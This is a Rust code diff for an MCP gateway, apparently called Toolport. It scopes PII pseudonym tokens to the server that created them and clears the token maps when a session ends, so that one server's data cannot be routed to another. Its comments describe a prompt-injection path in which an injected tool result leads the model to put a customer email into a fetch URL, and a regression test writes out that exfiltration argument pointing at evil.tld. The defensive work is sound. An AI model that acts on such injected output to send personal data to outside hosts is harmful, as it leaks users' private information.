@@ -3203,6 +3203,13 @@ fn resolve_http_caller(
 
     // No auth configured at all: reachable only when startup explicitly allowed
     // `--insecure-loopback`; keep the request resolver usable for that escape hatch.
+    //
+    // Every caller shares the identity `"open"`, so they also share one PII
+    // pseudonym map — the cross-client resolution the per-client keying exists to
+    // prevent (SBS-605). Origin scoping still holds within that map (a token only
+    // resolves for the server that minted it), so this is a weaker isolation
+    // boundary rather than an open channel. The mode is already labelled insecure;
+    // this is one more thing it gives up.
     if allow_insecure_open && env_token.is_none() && reg.http_clients.is_empty() {
         return Some((
             None,
@@ -3776,7 +3783,7 @@ fn execute_call(
                 // persisted, so an approver sees the recipient they are actually
                 // authorizing rather than `⟦EMAIL_1⟧`. Everything model-facing keeps
                 // the pseudonyms.
-                arguments: rehydrated_for_local_approver(reg, client, &arguments),
+                arguments: rehydrated_for_local_approver(reg, client, srv, &arguments),
                 tool_fingerprint: current_fp.clone(),
             };
             let mut approval_reason = reason;
@@ -4073,7 +4080,19 @@ fn execute_call(
     // mid-session still has tokens sitting in the model's context, and skipping
     // this would dispatch a literal `⟦EMAIL_1⟧` as the recipient. `rehydrate_args`
     // is already a no-op on an empty map.
-    let arguments = rehydrate_for_downstream(client, arguments);
+    //
+    // Scoped to the executing server (SBS-605): a token only resolves for a server
+    // that already produced that value. Anything else is refused here rather than
+    // dispatched, which is what closes the cross-server exfiltration path.
+    let arguments = match rehydrate_for_downstream(client, srv, arguments) {
+        Ok(args) => args,
+        Err(msg) => {
+            return json!({
+                "content": [{ "type": "text", "text": format!("Toolport: {msg}") }],
+                "isError": true,
+            });
+        }
+    };
 
     let started = Instant::now();
     let effective_mrtr = routed_mrtr.as_ref().or(mrtr);
@@ -4232,6 +4251,25 @@ fn pii_sessions() -> &'static Mutex<HashMap<String, pii::SessionMap>> {
 /// NUL so it cannot collide with a real client id.
 const PII_LOCAL_SESSION: &str = "\0local";
 
+/// Forget everything mapped for one client.
+///
+/// Called on MCP session teardown and on a fresh `initialize`. Without it "session"
+/// meant the whole gateway process: a new conversation against a long-lived HTTP
+/// gateway still resolved tokens the previous one minted, and real values stayed
+/// resident for the process lifetime with no eviction at all (SBS-605). Memory was
+/// bounded by `DEFAULT_MAX_VALUES`; PII retention was not.
+///
+/// Keyed by client, so a client running two concurrent MCP sessions clears both.
+/// That is deliberate — over-clearing costs a refused call, under-clearing leaks
+/// across conversations — and the tokens simply stop resolving rather than
+/// resolving to something wrong.
+fn clear_pii_session(client: Option<&str>) {
+    pii_sessions()
+        .lock()
+        .unwrap_or_else(std::sync::PoisonError::into_inner)
+        .remove(client.unwrap_or(PII_LOCAL_SESSION));
+}
+
 /// Run `f` against one client's map.
 ///
 /// A poisoned lock is recovered rather than propagated: the map is a cache, and
@@ -4247,14 +4285,34 @@ fn with_pii_session<T>(client: Option<&str>, f: impl FnOnce(&mut pii::SessionMap
     f(map)
 }
 
-/// Resolve pseudonyms on the owned dispatch copy only.
+/// Resolve pseudonyms on the owned dispatch copy only, for a call bound to `server`.
 ///
 /// Callers must retain the original tokenized value for every model-facing or
 /// persisted preflight surface (HITL, destructive confirmation, inspect and
 /// audit hashing), and invoke this only at the final downstream boundary.
-fn rehydrate_for_downstream(client: Option<&str>, mut arguments: Value) -> Value {
-    with_pii_session(client, |map| pii::rehydrate_args(map, &mut arguments));
-    arguments
+///
+/// `Err` when the arguments carry a token another server minted. That is the
+/// exfiltration shape from SBS-605 — an injected result talking the model into
+/// putting a CRM's email in a URL for some unrelated fetch tool — so it fails the
+/// call instead of dispatching. Dispatching the literal token instead would leak
+/// nothing, but it would also silently send a request the user never meant.
+fn rehydrate_for_downstream(
+    client: Option<&str>,
+    server: &str,
+    mut arguments: Value,
+) -> Result<Value, String> {
+    let refused = with_pii_session(client, |map| {
+        pii::rehydrate_args(map, server, &mut arguments)
+    });
+    if !refused.is_empty() {
+        let list = refused.into_iter().collect::<Vec<_>>().join(", ");
+        return Err(format!(
+            "refusing to send redacted values to '{server}': {list} came from a different server. \
+             Toolport only returns a value to the server that provided it, so one server's data \
+             cannot be routed to another."
+        ));
+    }
+    Ok(arguments)
 }
 
 /// Pseudonymize a result's text blocks in place, returning how many values were
@@ -4272,23 +4330,38 @@ fn rehydrate_for_downstream(client: Option<&str>, mut arguments: Value) -> Value
 /// them in place would push real PII into exactly the places this feature exists
 /// to keep it out of. The local broker is loopback-only and unpersisted, which is
 /// the one audience that should see real values before the wire does.
-fn rehydrated_for_local_approver(reg: &Registry, client: Option<&str>, arguments: &Value) -> Value {
+///
+/// Scoped to `server` like the dispatch path: the approver is deciding about a call
+/// to that server, so showing them a foreign server's value resolved would both
+/// misrepresent what is about to be sent and put PII on a screen for a call that is
+/// going to be refused anyway. Foreign tokens stay as tokens here.
+fn rehydrated_for_local_approver(
+    reg: &Registry,
+    client: Option<&str>,
+    server: &str,
+    arguments: &Value,
+) -> Value {
     if !reg.pii_redaction_effective() {
         return arguments.clone();
     }
     let mut copy = arguments.clone();
-    with_pii_session(client, |map| pii::rehydrate_args(map, &mut copy));
+    let _ = with_pii_session(client, |map| pii::rehydrate_args(map, server, &mut copy));
     copy
 }
 
 /// An incomplete pass is logged. This path fails OPEN -- a full map or an over-cap
 /// result leaves values in the clear -- and the whole point of returning
 /// `complete` was so that could be noticed rather than assumed away.
-fn pseudonymize_if_enabled(reg: &Registry, client: Option<&str>, result: &mut Value) -> usize {
+fn pseudonymize_if_enabled(
+    reg: &Registry,
+    client: Option<&str>,
+    server: &str,
+    result: &mut Value,
+) -> usize {
     if !reg.pii_redaction_effective() {
         return 0;
     }
-    let out = with_pii_session(client, |map| pii::pseudonymize_result(map, result));
+    let out = with_pii_session(client, |map| pii::pseudonymize_result(map, server, result));
     if !out.complete {
         eprintln!(
             "toolport: PII pseudonymization was incomplete for this result - some values reached the model in the clear (the session map is full, or the result exceeded the scan cap)."
@@ -4312,7 +4385,7 @@ fn defend_and_shape(
     // nothing (SOU-345).
     // PII first, then injection defense: the wrap must go around already-
     // pseudonymized text, not the other way round.
-    pseudonymize_if_enabled(reg, client, &mut result);
+    pseudonymize_if_enabled(reg, client, srv, &mut result);
     if reg.content_defense_effective() || reg.block_on_injection_effective() {
         let block = reg.should_block_injection_for(srv);
         if let Some(msg) = integrity::defend_content(srv, tool, &mut result, block) {
@@ -5628,7 +5701,10 @@ fn handle_request_with_cancel(
                     // setting, and nesting it under the injection guard would make
                     // it silently do nothing whenever content defense was off.
                     if !preserve_mcp_app {
-                        pseudonymize_if_enabled(reg, client, &mut result);
+                        // Same owning-server id content defense uses below, so a
+                        // resource's values are credited to the server that served it.
+                        let owner = router.resource_server(uri).unwrap_or(uri);
+                        pseudonymize_if_enabled(reg, client, owner, &mut result);
                     }
                     if !preserve_mcp_app
                         && (reg.content_defense_effective()
@@ -5724,7 +5800,8 @@ fn handle_request_with_cancel(
                     // Block mode (SOU-345) uses the owning server id for the exempt map
                     // and still runs when contentDefense is off but block is on.
                     // Independent of content defense, same reasoning as resources.
-                    pseudonymize_if_enabled(reg, client, &mut result);
+                    let owner = router.prompt_server(name).unwrap_or(name);
+                    pseudonymize_if_enabled(reg, client, owner, &mut result);
                     if reg.content_defense_effective() || reg.block_on_injection_effective() {
                         let srv = router.prompt_server(name).unwrap_or(name);
                         let block = reg.should_block_injection_for(srv);
@@ -9998,6 +10075,9 @@ fn handle_mcp_http(
                     // Drop resource subscriptions for this HTTP session and release
                     // any last-holder downstream subs (SOU-394).
                     cleanup_resource_subs_for_session(state, &sid);
+                    // The conversation is over; its pseudonym map must not outlive it
+                    // and resolve tokens for the next one (SBS-605).
+                    clear_pii_session(session_owner.map(|o| o.identity.as_str()));
                     HttpOut::new(204, "text/plain", String::new())
                 }
                 Err(e) => e,
@@ -10024,6 +10104,12 @@ fn handle_mcp_http(
                 .unwrap_or("");
             let has_id = req_obj.contains_key("id");
             let is_initialize = method_name == "initialize";
+            if is_initialize {
+                // A fresh handshake is a fresh conversation. Carrying the previous
+                // one's pseudonym map forward is the cross-conversation half of
+                // SBS-605.
+                clear_pii_session(session_owner.map(|o| o.identity.as_str()));
+            }
             let is_modern = modern_http_request(&req, headers);
             if is_modern {
                 if let Err(out) = validate_modern_http_headers(&req, headers) {
@@ -11952,14 +12038,53 @@ mod tests {
         let client = Some("pii-placement-regression");
         let token = with_pii_session(client, |map| {
             *map = pii::SessionMap::new();
-            map.pseudonymize("ada@example.com").text
+            map.pseudonymize("crm", "ada@example.com").text
         });
         let model_facing = json!({ "to": token });
 
-        let downstream = rehydrate_for_downstream(client, model_facing.clone());
+        let downstream = rehydrate_for_downstream(client, "crm", model_facing.clone())
+            .expect("the minting server may have its own value back");
 
         assert_eq!(model_facing["to"], "⟦EMAIL_1⟧");
         assert_eq!(downstream["to"], "ada@example.com");
+    }
+
+    #[test]
+    fn downstream_rehydration_refuses_another_servers_token() {
+        // SBS-605 at the dispatch boundary: an injected result talks the model into
+        // putting the CRM's customer address in a URL for an unrelated fetch tool.
+        // This is the call that must never leave the machine.
+        let client = Some("pii-cross-server-regression");
+        with_pii_session(client, |map| {
+            *map = pii::SessionMap::new();
+            map.pseudonymize("crm", "ada@example.com");
+        });
+        let exfil = json!({ "url": "https://evil.tld/?e=⟦EMAIL_1⟧" });
+
+        let err = rehydrate_for_downstream(client, "http-fetch", exfil)
+            .expect_err("a foreign token must fail the call, not dispatch");
+
+        assert!(err.contains("⟦EMAIL_1⟧"), "name the token: {err}");
+        assert!(
+            !err.contains("ada@example.com"),
+            "the refusal must not leak the value it is protecting: {err}"
+        );
+    }
+
+    #[test]
+    fn clearing_a_pii_session_drops_the_previous_conversations_map() {
+        // A new MCP session against a long-lived gateway must not resolve tokens the
+        // previous one minted (SBS-605).
+        let client = Some("pii-session-clear-regression");
+        with_pii_session(client, |map| {
+            *map = pii::SessionMap::new();
+            map.pseudonymize("crm", "ada@example.com");
+        });
+
+        clear_pii_session(client);
+
+        let still_mapped = with_pii_session(client, |map| !map.is_empty());
+        assert!(!still_mapped, "the map must not survive session teardown");
     }
 
     #[test]
